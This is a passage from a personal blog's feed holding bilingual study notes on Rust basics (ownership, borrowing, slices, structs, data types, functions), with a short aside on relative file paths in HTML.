    <content type="html"><![CDATA[<h3 id="rust"><a href="#rust" class="headerlink" title="rust"></a>rust</h3><p>All data <code>stored on the stack must have a known, fixed size.</code>Data with an unknown size at compile time or a size that might change must be stored on the heap instead.</p><p>Pushing to<code>the stack is faster than allocating on the heap</code> because the allocator never has to search for a place to store new data;<br><a id="more"></a></p><h3 id="Ownership-Rules"><a href="#Ownership-Rules" class="headerlink" title="Ownership Rules"></a>Ownership Rules</h3><p>解决堆上数据 的问题</p><p>Each value in Rust has a variable that’s called its owner.<br>There can only <code>be one owner at a time.</code><br>When the <code>owner goes out of scope,</code>the value will be dropped. <code>从堆中回收</code></p><p>string 存在scope中</p><p>the concept of copying the pointer, length, and capacity without copying the data probably sounds like making a shallow copy. </p><p>rust<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">let s1 = String::from(<span class="string">"hello"</span>);</span><br><span class="line">  <span class="params">|         -- move occurs because `s1` has type `std::string::String`, which does <span class="keyword">not</span> implement the `Copy` trait</span></span><br><span class="line"><span class="params">3 |</span>     let s2 = s1;</span><br><span class="line">  <span class="params">|              -- value moved here</span></span><br></pre></td></tr></table></figure></p><p>s1 无效 回收只s2</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let s1 = String::from(<span class="string">"hello"</span>);</span><br><span class="line">    let s2 = s1.clone();</span><br><span class="line"></span><br><span class="line">    println!(<span class="string">"s1 = &#123;&#125;, s2 = &#123;&#125;"</span>, s1, s2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x=<span class="number">5</span></span><br><span class="line">y=x</span><br></pre></td></tr></table></figure><p><code>栈中不用clone</code><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let s = String::from(<span class="string">"hello"</span>);  <span class="regexp">//</span> s comes into scope</span><br><span class="line"></span><br><span class="line">    takes_ownership(s);             <span class="regexp">//</span> s<span class="string">'s value moves into the function...</span></span><br><span class="line"><span class="string">                                    // ... and so is no longer valid here</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    let x = 5;                      // x comes into scope</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    makes_copy(x);                  // x would move into the function,</span></span><br><span class="line"><span class="string">                                    // but i32 is Copy, so it’s okay to still</span></span><br><span class="line"><span class="string">                                    // use x afterward</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">&#125; // Here, x goes out of scope, then s. But because s'</span>s value was moved, nothing</span><br><span class="line">  /<span class="regexp">/ special happens.</span></span><br></pre></td></tr></table></figure></p><h3 id="References-and-Borrowing"><a href="#References-and-Borrowing" class="headerlink" title="References and Borrowing"></a>References and Borrowing</h3><p>引用 不拿所有权 也称借<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">"hello"</span>);</span><br><span class="line"></span><br><span class="line">    change(&amp;mut s);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fn change(<span class="symbol">some_string:</span> &amp;mut String) &#123;</span><br><span class="line">    some_string.push_str(<span class="string">", world"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>一个可变变量只能引用一次</code><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">"hello"</span>);</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">        let r1 = &amp;mut s;</span><br><span class="line">    &#125; /<span class="regexp">/ r1 goes out of scope here, so we can make a new reference with no problems.</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    let r2 = &amp;mut s;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p><p>用花括号创建一个空间，来引用，</p><p> We also cannot have a mutable reference while we have an immutable one.<br><code>可变变量有不变引用后，不能创建可变引用</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let mut s = String::from(<span class="string">"hello"</span>);</span><br><span class="line"></span><br><span class="line">    let r1 = &amp;s; <span class="regexp">//</span> no problem</span><br><span class="line">    let r2 = &amp;s; <span class="regexp">//</span> no problem</span><br><span class="line">    println!(<span class="string">"&#123;&#125; and &#123;&#125;"</span>, r1, r2);</span><br><span class="line">    /<span class="regexp">/ r1 and r2 are no longer used after this point</span></span><br><span class="line"><span class="regexp"></span></span><br><span class="line"><span class="regexp">    let r3 = &amp;mut s; /</span><span class="regexp">/ no problem</span></span><br><span class="line"><span class="regexp">    println!("&#123;&#125;", r3);</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure><p><strong>引用范围从创建到最后一次使用<br>关键是不重叠</strong></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let reference_to_nothing = dangle();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn dangle() -&gt; &amp;String &#123; <span class="regexp">//</span> dangle returns a reference to a String</span><br><span class="line"></span><br><span class="line">    let s = String::from(<span class="string">"hello"</span>); <span class="regexp">//</span> s is a new String</span><br><span class="line"></span><br><span class="line">    &amp;s /<span class="regexp">/ we return a reference to the String, s</span></span><br><span class="line"><span class="regexp">&#125; /</span><span class="regexp">/ Here, s goes out of scope, and is dropped. Its memory goes away.</span></span><br><span class="line"><span class="regexp">  /</span><span class="regexp">/ Danger!</span></span><br></pre></td></tr></table></figure><h3 id="slice"><a href="#slice" class="headerlink" title="slice"></a>slice</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn first_word(<span class="symbol">s:</span> &amp;String) -&gt; usize &#123;</span><br><span class="line">    let bytes = s.as_bytes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i, &amp;item) <span class="keyword">in</span> bytes.iter().enumerate() &#123;</span><br><span class="line">        <span class="keyword">if</span> item == b<span class="string">' '</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    s.len()</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>iter</code>is a method that returns each element in a collection<br><code>enumerate</code> wraps the result of iter and returns each element as part of a tuple instead.<br><code>第一个参数是索引值，第二个是值的引用</code></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let s = String::from(<span class="string">"hello world"</span>);</span><br><span class="line"></span><br><span class="line">    let hello = &amp;s[<span class="number">0</span>..<span class="number">5</span>]; <span class="regexp">//</span><span class="number">0</span>可以省去</span><br><span class="line">    let world = &amp;s[<span class="number">6</span>..<span class="number">11</span>]; 存<span class="number">6</span>-<span class="number">10</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="string-slices"><a href="#string-slices" class="headerlink" title="string slices"></a>string slices</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">let s = String::from(<span class="string">"hello"</span>);</span><br><span class="line"></span><br><span class="line">let len = s.len();</span><br><span class="line"></span><br><span class="line">let slice = &amp;s[<span class="number">3</span>..len];</span><br><span class="line">let slice = &amp;s[<span class="number">3</span>..]; <span class="regexp">//</span>相同</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>The type that signifies “string slice” is written as &amp;str:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">fn first_word(<span class="symbol">s:</span> &amp;String) -&gt; &amp;str &#123;</span><br><span class="line">    let bytes = s.as_bytes();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (i, &amp;item) <span class="keyword">in</span> bytes.iter().enumerate() &#123;</span><br><span class="line">        <span class="keyword">if</span> item == b<span class="string">' '</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> &amp;s[<span class="number">0</span>..i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    &amp;s[..]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>String Literals Are Slices<br>固定字符串就是一种切片<br>The type of s here is &amp;str<br>it’s a slice pointing to that specific point of the binary</p><p>fn first_word(s: &amp;str) -&gt; &amp;str {<br><code>可以接受&amp;String 和 &amp;str</code> //String 和 字符串 如“hello”</p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">let a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line"></span><br><span class="line">let slice = &amp;a[<span class="number">1</span>..<span class="number">3</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="struct"><a href="#struct" class="headerlink" title="struct"></a>struct</h3><p>结构体字段里都是可变的<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">struct User &#123;</span><br><span class="line">    <span class="symbol">username:</span> String,</span><br><span class="line">    <span class="symbol">email:</span> String,</span><br><span class="line">    <span class="symbol">sign_in_count:</span> u64,</span><br><span class="line">    <span class="symbol">active:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">struct User &#123;</span><br><span class="line">    <span class="symbol">username:</span> String,</span><br><span class="line">    <span class="symbol">email:</span> String,</span><br><span class="line">    <span class="symbol">sign_in_count:</span> u64,</span><br><span class="line">    <span class="symbol">active:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let user1 = User &#123;</span><br><span class="line">        <span class="symbol">email:</span> String::from(<span class="string">"someone@example.com"</span>),</span><br><span class="line">        <span class="symbol">username:</span> String::from(<span class="string">"someusername123"</span>),</span><br><span class="line">        <span class="symbol">active:</span> <span class="literal">true</span>,</span><br><span class="line">        <span class="symbol">sign_in_count:</span> <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>顺序随便<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">struct User &#123;</span><br><span class="line">    <span class="symbol">username:</span> String,</span><br><span class="line">    <span class="symbol">email:</span> String,</span><br><span class="line">    <span class="symbol">sign_in_count:</span> u64,</span><br><span class="line">    <span class="symbol">active:</span> bool,</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fn build_user(<span class="symbol">email:</span> String, <span class="symbol">username:</span> String) -&gt; User &#123; <span class="regexp">//</span>返回struct 实例</span><br><span class="line">    User &#123;</span><br><span class="line">        <span class="symbol">email:</span> email,</span><br><span class="line">        <span class="symbol">username:</span> username,</span><br><span class="line">        <span class="symbol">active:</span> <span class="literal">true</span>,</span><br><span class="line">        <span class="symbol">sign_in_count:</span> <span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    let user1 = build_user(</span><br><span class="line">        String::from(<span class="string">"someone@example.com"</span>),</span><br><span class="line">        String::from(<span class="string">"someusername123"</span>),</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">fn build_user(<span class="symbol">email:</span> String, <span class="symbol">username:</span> String) -&gt; User &#123;</span><br><span class="line">    User &#123;</span><br><span class="line">        email,  <span class="regexp">//</span>省略rather than <span class="symbol">email:</span> email.</span><br><span class="line">        username,</span><br><span class="line">        <span class="symbol">active:</span> <span class="literal">true</span>,</span><br><span class="line">        <span class="symbol">sign_in_count:</span> <span class="number">1</span>,</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>更新赋予另一实例</strong><br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">struct User &#123;</span><br><span class="line">    <span class="symbol">username:</span> String,</span><br><span class="line">    <span class="symbol">email:</span> String,</span><br><span class="line">    <span class="symbol">sign_in_count:</span> u64,</span><br><span class="line">    <span class="symbol">active:</span> bool,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    let user1 = User &#123;</span><br><span class="line">        <span class="symbol">email:</span> String::from(<span class="string">"someone@example.com"</span>),</span><br><span class="line">        <span class="symbol">username:</span> String::from(<span class="string">"someusername123"</span>),</span><br><span class="line">        <span class="symbol">active:</span> <span class="literal">true</span>,</span><br><span class="line">        <span class="symbol">sign_in_count:</span> <span class="number">1</span>,</span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    let user2 = User &#123;</span><br><span class="line">        <span class="symbol">email:</span> String::from(<span class="string">"another@example.com"</span>),</span><br><span class="line">        <span class="symbol">username:</span> String::from(<span class="string">"anotherusername567"</span>),</span><br><span class="line">        ..user1  /<span class="regexp">/ .. specifies that the remaining fields not explicitly set should have the same value as the fields in the given instance.</span></span><br><span class="line"><span class="regexp">    &#125;;</span></span><br><span class="line"><span class="regexp">&#125;</span></span><br></pre></td></tr></table></figure></p><h3 id="tuple-struct"><a href="#tuple-struct" class="headerlink" title="tuple struct"></a>tuple struct</h3><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    struct Color(i32, i32, i32);</span><br><span class="line">    struct Point(i32, i32, i32);</span><br><span class="line"></span><br><span class="line">    let black = Color(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    let origin = Point(<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>做网站<br>文件路径的一些通用规则：</p><p>若引用的目标文件与 HTML 文件同级，只需直接使用文件名，比如 <code>my-image.jpg</code>。<br>要引用子文件夹中的文件，要在路径前写下目录名并加一个斜杠，比如 <code>subdirectory/my-image.jpg</code>。<br>若引用的目标文件位于 HTML 文件的上级，需要加上两个点。比如，如果 index.html 在 test-site 下面的一个子目录而 my-image.png 在 test-site 目录，你可以在 index.html 里使用 <code>../my-image.png 引用 my-image.png</code>。<br>以上方法可以随意组合，比如 ../subdirectory/another-subdirectory/my-image.png。</p>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;rust&quot;&gt;&lt;a href=&quot;#rust&quot; class=&quot;headerlink&quot; title=&quot;rust&quot;&gt;&lt;/a&gt;rust&lt;/h3&gt;&lt;p&gt;All data &lt;code&gt;stored on the stack must have a known, fixed size.&lt;/code&gt;Data with an unknown size at compile time or a size that might change must be stored on the heap instead.&lt;/p&gt;
&lt;p&gt;Pushing to&lt;code&gt;the stack is faster than allocating on the heap&lt;/code&gt; because the allocator never has to search for a place to store new data;&lt;br&gt;
    
    </summary>
    
    
      <category term="RUST" scheme="http://finsenty54.github.io/tags/RUST/"/>
    
  </entry>
  
  <entry>
    <title>RUST学习1</title>
    <link href="http://finsenty54.github.io/2020/07/27/RUST%E5%AD%A6%E4%B9%A01/"/>
    <id>http://finsenty54.github.io/2020/07/27/RUST学习1/</id>
    <published>2020-07-27T07:38:11.000Z</published>
    <updated>2020-07-27T07:50:07.327Z</updated>
    
    <content type="html"><![CDATA[<h3 id="运行命令"><a href="#运行命令" class="headerlink" title="运行命令"></a>运行命令</h3><p><code>cargo doc --open</code><br><code>rustup doc</code><br><code>cargo new --vcs=git</code><br><code>cargo build</code><br><code>cargo run</code><br><code>cargo check</code>更快编译，但不生成可执行文件<br><code>cargo build --release</code> 生成的执行文件运行更快<br>benchmark基准测试<br><a id="more"></a><br>Variables and Mutability<br>mutable 易变的</p><p>let mut x=5</p><h6 id="rust默认变量不可变"><a href="#rust默认变量不可变" class="headerlink" title="rust默认变量不可变"></a>rust默认变量不可变</h6><p>fn main() {<br>const MAX_POINTS: u32 = 100_000;<br>}<br>const 整个运行时间都存在</p><p>fn main() {<br>    let spaces = “   “;<br>    let spaces = spaces.len();<br>}</p><h3 id="Data-Types"><a href="#Data-Types" class="headerlink" title="Data Types"></a>Data Types</h3><p>interger 默认i32<br>float 默认 f64<br>char ‘’ 4字节<em>Accented letters; Chinese, Japanese, and Korean characters; emoji; and zero-width spaces are all valid char values in Rust. </em><br>string “”</p><p>tuple 元组 固定 类型可以不同<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">fn <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    let tup: (i32, f64, u8) = (<span class="number">500</span>, <span class="number">6.4</span>, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function">fn <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    let x: (i32, f64, u8) = (<span class="number">500</span>, <span class="number">6.4</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">    let five_hundred = x<span class="number">.0</span>;</span><br><span class="line"></span><br><span class="line">    let six_point_four = x<span class="number">.1</span>;</span><br><span class="line"></span><br><span class="line">    let one = x<span class="number">.2</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>array 数组 类型相同 固定 存在栈中<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">fn <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    let a = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">let</span> months = [<span class="string">"January"</span>, <span class="string">"February"</span>, <span class="string">"March"</span>, <span class="string">"April"</span>, <span class="string">"May"</span>, <span class="string">"June"</span>, <span class="string">"July"</span>,</span><br><span class="line">              <span class="string">"August"</span>, <span class="string">"September"</span>, <span class="string">"October"</span>, <span class="string">"November"</span>, <span class="string">"December"</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">let</span> a: [i32; <span class="number">5</span>] = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line"><span class="keyword">let</span> a = [<span class="number">3</span>; <span class="number">5</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> first = a[<span class="number">0</span>];</span><br></pre></td></tr></table></figure><p>rust会检查索引跃出</p><p>vector 不固定</p><h3 id="Functions"><a href="#Functions" class="headerlink" title="Functions"></a>Functions</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"Hello, world!"</span>);</span><br><span class="line"></span><br><span class="line">    another_function();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn another_function() &#123;</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"Another function."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Rust<code>doesn’t care</code>where you define your functions, only that they’re defined somewhere.</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    another_function(<span class="number">5</span>, <span class="number">6</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fn another_function(x: i32, y: i32) &#123;</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"The value of x is: &#123;&#125;"</span>, x);</span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"The value of y is: &#123;&#125;"</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>必须声明参数类型</p><hr><p><code>Statements</code>are instructions that perform some action and do not return a value.<br>let y = 6; 无返回值不能赋给其他变量<br><code>Expressions</code> evaluate to a resulting value.</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> x = <span class="number">5</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> y = &#123;</span><br><span class="line">        <span class="keyword">let</span> x = <span class="number">3</span>;</span><br><span class="line">        x + <span class="number">1</span></span><br><span class="line">    &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"The value of y is: &#123;&#125;"</span>, y);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> Note the x + 1 line without a semicolon at the end, which is unlike most of the lines you’ve seen so far. <strong>Expressions do not include ending semicolons.</strong> If you add a semicolon to the end of an expression, you turn it into a statement, which will then not return a value.</p><p>返回值<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn five() -&gt; i32 &#123;</span><br><span class="line">    <span class="number">5</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> x = five();</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"The value of x is: &#123;&#125;"</span>, x);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> x = plus_one(<span class="number">5</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">println</span>!(<span class="string">"The value of x is: &#123;&#125;"</span>, x);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">fn plus_one(x: i32) -&gt; i32 &#123;</span><br><span class="line">    x + <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="Comments"><a href="#Comments" class="headerlink" title="Comments"></a>Comments</h5><p>//</p><h3 id="control"><a href="#control" class="headerlink" title="control"></a>control</h3><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">fn main() &#123;</span><br><span class="line">    <span class="keyword">let</span> number = <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> number &lt; <span class="number">5</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"condition was true"</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">println</span>!(<span class="string">"condition was false"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> Rust will <strong>not</strong> automatically try to <strong>convert non-Boolean types to a Boolean</strong></p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 